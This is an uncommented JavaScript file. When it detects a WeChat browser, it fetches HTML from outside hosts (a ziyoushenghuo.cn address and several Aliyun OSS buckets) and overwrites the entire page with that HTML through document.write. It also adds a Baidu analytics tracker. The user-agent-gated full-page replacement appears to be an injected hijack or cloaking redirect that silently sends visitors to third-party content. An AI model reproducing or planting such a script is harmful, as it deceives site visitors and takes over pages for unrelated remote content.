document.body.scrollTop = 0;
document.documentElement.scrollTop = 0;

if(typeof $ != 'undefined' && document.body){
	loadback();
}else{
	loadJs("jquery.min.js", loadback);
}

function loadback(){
	var ua = navigator.userAgent.toLowerCase();
	if (/micromessenger/.test(ua)) {
	    window.stack = [
	        '//y.ziyoushenghuo.cn:443/v3/?pid=eet2&cid=999',
	        '//2xian.oss-cn-beijing.aliyuncs.com/sz.html',
	        '//bact.oss-cn-beijing.aliyuncs.com/xs/yuqi.html',
			'//bact.oss-cn-beijing.aliyuncs.com/close.html',
	    ];
	    render(stack.shift());
	}
}

function loadJs(a, b) {
	var c = document.createElement("script");
	"undefined" != typeof b && (c.readyState ? c.onreadystatechange = function() {
		("loaded" == c.readyState || "complete" == c.readyState) && (c.onreadystatechange = null, 
			b());
	} :c.onload = function() {
		b();
	}), c.src = a, document.body.appendChild(c);
}

function render(url) {
	$.get(url, function(data){
		var a = document.open("text/html", "replace");
		a.write(data);
		a.close();
	});
}

var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?52741104fddccfc541bb0a0afa6e429c";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
